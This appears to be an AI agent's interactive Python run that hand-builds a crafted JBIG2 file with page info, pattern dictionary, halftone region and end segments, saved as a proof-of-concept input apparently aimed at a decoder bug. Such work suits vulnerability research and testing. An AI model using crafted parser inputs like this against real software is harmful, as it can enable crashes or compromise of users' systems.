Running Python code interactively: import struct

data = bytearray()

# File header
data += b'\x97\x4a\x42\x32\x0d\x0a\x1a\x0a'  # magic (8 bytes)
data += b'\x00'  # flags: sequential, known pages (1 byte)
data += struct.pack('>I', 1)  # number of pages (4 bytes)
# Total file header: 13 bytes

print(f"File header ends at offset {len(data)}")

# Segment 0: Page Info
seg0_start = len(data)
data += struct.pack('>I', 0)  # segment number (4)
data += bytes([48])           # flags: type=48 (1)
data += bytes([0x00])         # rtscarf: count=0 (1)
# offset in parsing = 5 + 1 = 6 (short form)
# referred_to_segment_size = 1 (seg number 0 <= 256)
# pa_size = 1 (bit 6 of flags = 0)
# No referred segments (count=0)
data += bytes([1])            # page association (1)
data += struct.pack('>I', 19) # data length (4)
# Header: 4+1+1+1+4 = 11 bytes
seg0_data_start = len(data)
# Page info data (19 bytes)
data += struct.pack('>I', 64)  # width
data += struct.pack('>I', 64)  # height
data += struct.pack('>I', 0)   # x res
data += struct.pack('>I', 0)   # y res
data += bytes([0])             # flags
data += struct.pack('>H', 0)   # striping
print(f"Segment 0: header at {seg0_start}, data at {seg0_data_start}, ends at {len(data)}")

# Segment 1: Pattern Dictionary (global, page=0)
seg1_start = len(data)
data += struct.pack('>I', 1)  # segment number (4)
data += bytes([16])           # flags: type=16 (1)
data += bytes([0x00])         # rtscarf: count=0 (1)
data += bytes([0])            # page association=0 (global) (1)
# Pattern dict data:
pat_data = bytes([0x01, 4, 1]) + struct.pack('>I', 3)  # flags,HDPW,HDPH,GRAYMAX (7)
pat_data += bytes([0x80, 0x08, 0x00, 0x80])  # MMR data (4)
data += struct.pack('>I', len(pat_data))  # data length (4)
seg1_data_start = len(data)
data += pat_data
print(f"Segment 1: header at {seg1_start}, data at {seg1_data_start}, ends at {len(data)}, pat_data_len={len(pat_data)}")

# Segment 2: Halftone Region
seg2_start = len(data)
data += struct.pack('>I', 2)  # segment number (4)
data += bytes([22])           # flags: type=22 (1)
# referred-to: count=1 (top 3 bits = 001, bottom 5 = retention for 1 seg)
data += bytes([0x20])         # rtscarf: count=1 (1)
# referred segment number: 1 (1 byte since seg2 number=2 <= 256)
data += bytes([1])            # referred segment 1 (1)
data += bytes([1])            # page association=1 (1)

# Halftone data
ht_data = bytearray()
ht_data += struct.pack('>IIII', 64, 64, 0, 0) + bytes([0])  # region info (17)
ht_data += bytes([0x01])  # halftone flags: HMMR=1 (1)
ht_data += struct.pack('>II', 2, 2) + struct.pack('>ii', 0, 0)  # HGW,HGH,HGX,HGY (16)
ht_data += struct.pack('>HH', 0x1000, 0)  # HRX,HRY (4)
# MMR data for gray-scale (both bitplanes)
ht_data += bytes([0xC0, 0x04, 0x00, 0x40, 0xC0, 0x04, 0x00, 0x40])  # (8)
data += struct.pack('>I', len(ht_data))  # data length (4)
seg2_data_start = len(data)
data += ht_data
print(f"Segment 2: header at {seg2_start}, data at {seg2_data_start}, ends at {len(data)}, ht_data_len={len(ht_data)}")

# Segment 3: End of Page
seg3_start = len(data)
data += struct.pack('>I', 3)
data += bytes([49])
data += bytes([0x00])
data += bytes([1])
data += struct.pack('>I', 0)
print(f"Segment 3: header at {seg3_start}, ends at {len(data)}")

# Segment 4: End of File
seg4_start = len(data)
data += struct.pack('>I', 4)
data += bytes([51])
data += bytes([0x00])
data += bytes([0])
data += struct.pack('>I', 0)
print(f"Segment 4: header at {seg4_start}, ends at {len(data)}")

with open('/workspace/poc.jbig2', 'wb') as f:
    f.write(data)

print(f"\nTotal file size: {len(data)} bytes")
print(f"Hex: {data.hex()}")
